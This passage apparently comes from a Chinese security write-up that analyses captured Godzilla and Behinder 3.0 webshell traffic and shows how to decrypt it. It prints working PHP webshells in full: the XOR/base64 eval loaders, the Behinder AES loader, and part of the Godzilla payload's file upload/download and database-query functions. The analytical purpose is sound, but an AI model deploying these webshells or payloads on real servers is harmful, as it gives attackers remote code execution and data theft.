$q = @ora_parse($T, "{$sql}"); $R = ora_exec($T); if ($R) { $n = ora_numcols($T); $data="ok\n"; for ($i = 0; $i &lt; $n; $i++) { $data.=base64_encode(Ora_ColumnName($T, $i))."\t"; } $data.="\n"; while (ora_fetch($T)) { for ($i = 0; $i &lt; $n; $i++) { $data.=base64_encode(trim(ora_getcolumn($T, $i)))."\t"; } $data.="\n"; } return $data; } else { return "false"; } } } function sqlite_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $dbh=new SQLite3($host); if(!$dbh){ return "ERROR://CONNECT ERROR".SQLite3::lastErrorMsg(); }else{ $stmt=$dbh-&gt;prepare($sql); if(!$stmt){ return "ERROR://".$dbh-&gt;lastErrorMsg(); } else { $result=$stmt-&gt;execute(); if(!$result){ return $dbh-&gt;lastErrorMsg(); }else{ $bool=True; $data="ok\n"; while($res=$result-&gt;fetchArray(SQLITE3_ASSOC)){ if($bool){ foreach($res as $key=&gt;$value){ $data.=base64_encode($key)."\t"; } $bool=False; $data.="\n"; } foreach($res as $key=&gt;$value){ $data.=base64_encode($value!==NULL?$value:"NULL")."\t"; } $data.="\n"; } if($bool){ if(!$result-&gt;numColumns()){ return "Query OK, ".$dbh-&gt;changes()." rows affected"; }else{ return "ERROR://Table is empty."; } }else{ return $data; } } } $dbh-&gt;close(); } } function pdoExec($databaseType,$host,$port,$username,$password,$execType,$currentDb,$sql){ $conn=null; if ($databaseType==="oracle"){ $databaseType="orcl"; } if (strpos($host,"=")!==false){ $conn = new PDO($host, $username, $password); }else if (!empty($currentDb)){ $conn = new PDO("{$databaseType}:host=$host;port={$port};dbname={$currentDb}", $username, $password); }else{ $conn = new PDO("{$databaseType}:host=$host;port={$port};", $username, $password); } $conn-&gt;setAttribute(3, 0); if ($execType=="update"){ $affectRows=$conn-&gt;exec($sql); if ($affectRows!==false){ return "Query OK, ".$conn-&gt;exec($sql)." rows affected"; }else{ return "Err-&gt;\n".implode(',',$conn-&gt;errorInfo()); } }else{ $data="ok\n"; $stm=$conn-&gt;prepare($sql); if ($stm-&gt;execute()){ $row=$stm-&gt;fetch(2); $_row="\n"; foreach (array_keys($row) as $key){ $data.=base64_encode($key)."\t"; $_row.=base64_encode($row[$key])."\t"; } $data.=$_row."\n"; while ($row=$stm-&gt;fetch(2)){ foreach (array_keys($row) as $key){ $data.=base64_encode($row[$key])."\t"; } $data.="\n"; } return $data; }else{ return "Err-&gt;\n".implode(',',$stm-&gt;errorInfo()); } } } if ($dbType=="mysql"&amp;&amp;(class_exists("mysqli")||function_existsEx("mysql_connect")||function_existsEx("mysqli_connect"))){ if (class_exists("mysqli")){ return mysqli_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }elseif (function_existsEx("mysql_connect")){ return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }else if (function_existsEx("mysqli_connect")){ return mysqliEx_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType=="postgresql"&amp;&amp;function_existsEx("pg_connect")){ if (function_existsEx("pg_connect")){ return pg_execEx($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType=="sqlserver"&amp;&amp;(function_existsEx("sqlsrv_connect")||function_existsEx("mssql_connect"))){ if (function_existsEx("sqlsrv_connect")){ return sqlsrv_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); }elseif (function_existsEx("mssql_connect")){ return mssql_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); } }elseif ($dbType=="oracle"&amp;&amp;(function_existsEx("oci_connect")||function_existsEx("ora_plogon"))){ if (function_existsEx("oci_connect")){ return oci_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }else if (function_existsEx("ora_plogon")){ return oci_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType=="sqlite"&amp;&amp;class_exists("SQLite3")){ return sqlite_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } if (extension_loaded("pdo")){ return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); }else{ return "no extension"; } } function base64Encode($data){ return base64_encode($data); } function test(){ return "ok"; } function get($key){ global $parameters; if (isset($parameters[$key])){ return $parameters[$key]; }else{ return null; } } function getAllParameters(){ global $parameters; return $parameters; } function includeCode(){ $classCode=get("binCode"); $codeName=get("codeName"); $_SES=&amp;getSession(); $_SES[$codeName]=$classCode; return "ok"; } function base64Decode($string){ return base64_decode($string); } function convertFilePermissions($fileAttr){ $mod=0; if (strpos($fileAttr,'R')!==false){ $mod=$mod+0444; } if (strpos($fileAttr,'W')!==false){ $mod=$mod+0222; } if (strpos($fileAttr,'X')!==false){ $mod=$mod+0111; } return $mod; } function g_close(){ @session_start(); $_SES=&amp;getSession(); $_SES=null; if (@session_destroy()){ return "ok"; }else{ return "fail!"; } } function bigFileDownload(){ $mode=get("mode"); $fileName=get("fileName"); $readByteNum=get("readByteNum"); $position=get("position"); if ($mode=="fileSize"){ return @filesize($fileName).""; }elseif ($mode=="read"){ if (function_existsEx("fopen")&amp;&amp;function_existsEx("fread")&amp;&amp;function_existsEx("fseek")){ $handle=fopen($fileName,"rb"); if ($handle!==false){ @fseek($handle,$position); $data=fread($handle,$readByteNum); @fclose($handle); if ($data!==false){ return $data; }else{ return "cannot read file"; } }else{ return "cannot open file"; } }else if (function_existsEx("file_get_contents")){ return file_get_contents($fileName,false,null,$position,$readByteNum); }else{ return "no function"; } }else{ return "no mode"; } } function bigFileUpload(){ $fileName=get("fileName"); $fileContents=get("fileContents"); $position=get("position"); if(function_existsEx("fopen")&amp;&amp;function_existsEx("fwrite")&amp;&amp;function_existsEx("fseek")){ $handle=fopen($fileName,"ab"); if ($handle!==false){ fseek($handle,$position); $len=fwrite($handle,$fileContents); @fclose($handle); if ($len!==false){ return "ok"; }else{ return "cannot write file"; } }else{ return "cannot open file"; } }else if (function_existsEx("file_put_contents")){ if (file_put_contents($fileName,$fileContents,FILE_APPEND)!==false){ return "ok"; }else{ return "writer fail"; } }else{ return "no function"; } } function canCallGzipEncode(){ if (function_existsEx("gzencode")){ return "1"; }else{ return "0"; } } function canCallGzipDecode(){ if (function_existsEx("gzdecode")){ return "1"; }else{ return "0"; } } function bytesToInteger($bytes, $position) { $val = 0; $val = $bytes[$position + 3] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position + 2] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position + 1] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position] &amp; 0xff; return $val; } function isGzipStream($bin){ if (strlen($bin)&gt;=2){ $bin=substr($bin,0,2); $strInfo = @unpack("C2chars", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); switch ($typeCode) { case 31139: return true; default: return false; } }else{ return false; } } function getBytes($string) { $bytes = array(); for($i = 0; $i &lt; strlen($string); $i++){ array_push($bytes,ord($string[$i])); } return $bytes; }

内容包含了文件操作、执行命令等诸多模块，方便后续调用。
PHP_EVEAL_XOR_BASE64这个shell脚本并无特别，一句话脚本上传即可。在流上与PHP_XOR_BASE64上的区别很明显，PHP_XOR_BASE64是key=加密，PHP_EVEAL_XOR_BASE64是pass=加密&amp;key=加密，那么我们需要考虑的部分在于pass后面跟了什么内容由流可得：
pass=eval%28base64_decode%28strrev%28urldecode%28%27
url解码：
pass=eval(base64_decode(strrev(urldecode('

即是这段加密信息解密的方法：
K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD

将加密url解密后：
K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD

再将代码逆序排列：
DQpAc2Vzc2lvbl9zdGFydCgpOw0KQHNldF90aW1lX2xpbWl0KDApOw0KQGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIGVuY29kZSgkRCwkSyl7DQogICAgZm9yKCRpPTA7JGk8c3RybGVuKCREKTskaSsrKSB7DQogICAgICAgICRjID0gJEtbJGkrMSYxNV07DQogICAgICAgICREWyRpXSA9ICREWyRpXV4kYzsNCiAgICB9DQogICAgcmV0dXJuICREOw0KfQ0KJHBhc3M9J2tleSc7DQokcGF5bG9hZE5hbWU9J3BheWxvYWQnOw0KJGtleT0nM2M2ZTBiOGE5YzE1MjI0YSc7DQppZiAoaXNzZXQoJF9QT1NUWyRwYXNzXSkpew0KICAgICRkYXRhPWVuY29kZShiYXNlNjRfZGVjb2RlKCRfUE9TVFskcGFzc10pLCRrZXkpOw0KICAgIGlmIChpc3NldCgkX1NFU1NJT05bJHBheWxvYWROYW1lXSkpew0KICAgICAgICAkcGF5bG9hZD1lbmNvZGUoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0sJGtleSk7DQogICAgICAgIGlmIChzdHJwb3MoJHBheWxvYWQsImdldEJhc2ljc0luZm8iKT09PWZhbHNlKXsNCiAgICAgICAgICAgICRwYXlsb2FkPWVuY29kZSgkcGF5bG9hZCwka2V5KTsNCiAgICAgICAgfQ0KCQlldmFsKCRwYXlsb2FkKTsNCiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDAsMTYpOw0KICAgICAgICBlY2hvIGJhc2U2NF9lbmNvZGUoZW5jb2RlKEBydW4oJGRhdGEpLCRrZXkpKTsNCiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDE2KTsNCiAgICB9ZWxzZXsNCiAgICAgICAgaWYgKHN0cnBvcygkZGF0YSwiZ2V0QmFzaWNzSW5mbyIpIT09ZmFsc2Upew0KICAgICAgICAgICAgJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV09ZW5jb2RlKCRkYXRhLCRrZXkpOw0KICAgICAgICB9DQogICAgfQ0KfQ0K

然后再base64解码：

@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
  for($i=0;$i&lt;strlen($D);$i++) {
    $c = $K[$i+1&amp;15];
    $D[$i] = $D[$i]^$c;
  }
  return $D;
}
$pass='key';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
  $data=encode(base64_decode($_POST[$pass]),$key);
  if (isset($_SESSION[$payloadName])){
    $payload=encode($_SESSION[$payloadName],$key);
    if (strpos($payload,"getBasicsInfo")===false){
      $payload=encode($payload,$key);
    }
    eval($payload);
    echo substr(md5($pass.$key),0,16);
    echo base64_encode(encode(@run($data),$key));
    echo substr(md5($pass.$key),16);
  }else{
    if (strpos($data,"getBasicsInfo")!==false){
      $_SESSION[$payloadName]=encode($data,$key);
    }
  }
}

即是PHP_XOR_BASE64的默认shell，至于后面key的编码和PHP_XOR_BASE64解密方法一致，可参考上面小节。
PHP_XOR_RAW对应的默认木马文件：
&lt;?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i&lt;strlen($D);$i++) {
        $c = $K[$i+1&amp;15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName='payload';
$key='3c6e0b8a9c15224a';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
        eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}

这里根据shell可以得到 解密过程更简单一点，但它需要提取二进制数据进行解密，直接用wireshark有点麻烦就在哥斯拉的shell里添了：
$b = file_put_contents('raw.txt', $data);

将二进制文本存了下来，然后直接读取解密：
&lt;?php 
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i&lt;strlen($D);$i++) {
        $c = $K[$i+1&amp;15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';



$file_path = "raw.txt";
if (file_exists($file_path)) {
    $fp = fopen($file_path, "r");
    $post = fread($fp, filesize($file_path));
    $post = str_replace("\r\n", "
", $post);
}


#$post = "";


#echo base64_decode($post);
echo "&lt;br/&gt;";
echo "&lt;br/&gt;";

#$data=encode(base64_decode($post),$key);
$data=encode(($post),$key);
echo $data;

冰蝎3.0这里还是以php为例，默认shell如下：
&lt;?php
@error_reporting(0);
session_start();
    $key="a02439ec229d8be0"; //该密钥为连接密码32位md5值的前16位，默认连接密码POST
    $_SESSION['k']=$key;
    session_write_close();
    $post=file_get_contents("php://input");
    if(!extension_loaded('openssl'))
    {
        $t="base64_"."decode";
        $post=$t($post."");
        
        for($i=0;$i&lt;strlen($post);$i++) {
                 $post[$i] = $post[$i]^$key[$i+1&amp;15]; 
                }
    }
    else
    {
        $post=openssl_decrypt($post, "AES128", $key);
    }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?&gt;

由shell可得冰蝎所进行ase加密的恶意代码，这里解密需要密钥，而密钥是由设置连接密码32位md5加密的前16位组成，整体解法并不复杂。
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

ASE加密模式CBC，填充：okcs7padding，密钥长度：128位，密钥：a02439ec229d8be0：
Pssert|eval(base64_decode('QGVycm9yX3JlcG9ydGluZygwKTsNCg0KZnVuY3Rpb24gZ2V0U2FmZVN0cigkc3RyKXsNCiAgICAkczEgPSBpY29udigndXRmLTgnLCdnYmsvL0lHTk9SRScsJHN0cik7DQogICAgJHMwID0gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzMSk7DQogICAgaWYoJHMwID09ICRzdHIpew0KICAgICAgICByZXR1cm4gJHMwOw0KICAgIH1lbHNlew0KICAgICAgICByZXR1cm4gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzdHIpOw0KICAgIH0NCn0NCmZ1bmN0aW9uIG1haW4oJGNtZCwkcGF0aCkNCnsNCiAgICBAc2V0X3RpbWVfbGltaXQoMCk7DQogICAgQGlnbm9yZV91c2VyX2Fib3J0KDEpOw0KICAgIEBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLCAwKTsNCiAgICAkcmVzdWx0ID0gYXJyYXkoKTsNCiAgICAkUGFkdEpuID0gQGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7DQogICAgaWYgKCEgZW1wdHkoJFBhZHRKbikpIHsNCiAgICAgICAgJFBhZHRKbiA9IHByZWdfcmVwbGFjZSgnL1ssIF0rLycsICcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBleHBsb2RlKCcsJywgJFBhZHRKbik7DQogICAgICAgICRQ